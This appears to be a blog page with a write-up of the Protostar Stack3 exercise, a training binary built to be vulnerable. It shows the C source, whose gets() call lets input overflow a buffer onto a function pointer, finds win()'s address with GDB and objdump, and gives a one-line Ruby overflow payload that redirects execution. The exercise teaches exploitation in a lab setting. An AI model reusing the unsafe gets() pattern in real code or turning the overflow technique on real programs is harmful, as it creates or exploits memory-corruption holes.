<!doctype html>
<html>
    <head>
        <meta charset="utf-8">
        <title>zlowram's blog</title>
        <link href="/css/style.css" rel="stylesheet">
        <link href="/css/prism.css" rel="stylesheet" />
		<meta name="description" content="Yet another blog of another infosec enthusiast. CTFs, reversing, exploiting, coding and more.">
		<meta name="keywords" content="hacking, CTF, write-up, exploiting, reversing">
		<script>
		  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
		  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

		  ga('create', 'UA-93249230-1', 'auto');
		  ga('send', 'pageview');

		</script>
    </head>
    <body>

        <div class="container">

            <div class="site-nav">

            </div><!-- /.site-nav -->

            <div class="site-header">
                <pre>
$$\       $$\                                   $$\                                                          
$$ |      $$ |                                  $$ |                                                         
$$$$$$$\  $$ | $$$$$$\   $$$$$$\      $$$$$$$$\ $$ | $$$$$$\  $$\  $$\  $$\  $$$$$$\  $$$$$$\  $$$$$$\$$$$\  
$$  __$$\ $$ |$$  __$$\ $$  __$$\     \____$$  |$$ |$$  __$$\ $$ | $$ | $$ |$$  __$$\ \____$$\ $$  _$$  _$$\ 
$$ |  $$ |$$ |$$ /  $$ |$$ /  $$ |      $$$$ _/ $$ |$$ /  $$ |$$ | $$ | $$ |$$ |  \__|$$$$$$$ |$$ / $$ / $$ |
$$ |  $$ |$$ |$$ |  $$ |$$ |  $$ |     $$  _/   $$ |$$ |  $$ |$$ | $$ | $$ |$$ |     $$  __$$ |$$ | $$ | $$ |
$$$$$$$  |$$ |\$$$$$$  |\$$$$$$$ |<span class="title-dot">$$\</span> $$$$$$$$\ $$ |\$$$$$$  |\$$$$$\$$$$  |$$ |  <span class="title-dot">$$\</span>\$$$$$$$ |$$ | $$ | $$ |
\_______/ \__| \______/  \____$$ |<span class="title-dot">\__|</span>\________|\__| \______/  \_____\____/ \__|  <span class="title-dot">\__|</span>\_______|\__| \__| \__|
                        $$\   $$ |                                                                           
                        \$$$$$$  |                                                                           
                         \______/                   
                </pre>
            </div><!-- /.site-header -->

            <div class="row">
                <div class="nav-bar">
                    --| <a href="/">Home</a> |--
                </div><!-- /.nav-bar -->

                <div class="blog-post">
                    <h2 class="post-title">Exploit-exercises Protostar Stack3 write-up </h2>
                    <p class="post-meta">by zlowram on December 9, 2014</p> 
                    <p>In this exercise, things start to be more fun. Until now the objective of the previous exercises was to overwrite a value of a variable in order to alter the behaviour of the program.
Now, the objective is to redirect the execution flow of the program, to a function called win().</p>

<pre><code class="language-c">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void win()
{
  printf(&quot;code flow successfully changed\n&quot;);
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf(&quot;calling function pointer, jumping to 0x%08x\n&quot;, fp);
      fp();
  }
}
</code></pre>

<p>If we pay attention at the provided code, we have a pointer to a function
called fp. If we are able to overwrite its value with the address of the
function win(), then we would successfully redirect the execution flow and,
therefore, solve the exercise.</p>

<p>In order to obtain the address of the funcion win() we have two options, using
GDB or objdump.</p>

<ul>
<li><p>GDB:</p>

<pre><code class="language-markup">(gdb) info address win
Symbol &quot;win&quot; is a function at address 0x8048424
</code></pre></li>

<li><p>objdump:</p>

<pre><code class="language-markup">$ objdump -t ./stack3 | grep win
08048424 g     F .text  00000014              win
</code></pre></li>
</ul>

<p>Now that we already have the address of win() (0x8048424), we need to overwrite
the value of fp with it. To do so, we have the classic scenario of buffer
overflow, so we need to calculate the padding needed to step on fp. As it is,
yet again, the same case as the previous stackX exercises, the padding is 64
bytes. Finally, we stuff the 64 byte follwed by the win() address (watch out
the endianess!) and the exercise is solved!</p>

<p>The solution is in the following snippet:</p>

<pre><code class="language-bash">#!/bin/bash

ruby -e ' print &quot;A&quot;*64 + &quot;\x24\x84\x04\x08&quot; ' | ./stack3
</code></pre>

                    <div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
var disqus_shortname = 'nopatch'; // required: replace example with your forum shortname
var disqus_identifier = '/2014/12/9/exploit-exercises-protostar-stack3/';

/* * * DON'T EDIT BELOW THIS LINE * * */
(function() {
 var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
 dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
 })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

                </div><!-- /.blog-post -->

            </div><!-- /.row -->

        </div><!-- /.container -->
        <div class="footer">
            Powered by <a href="http://github.com/zlowram/blgo">blgo</a> 
        </div><!-- /.footer -->

        <!-- Prism.js -->
        <script src="/js/prism.js"></script>
    </body>
</html>
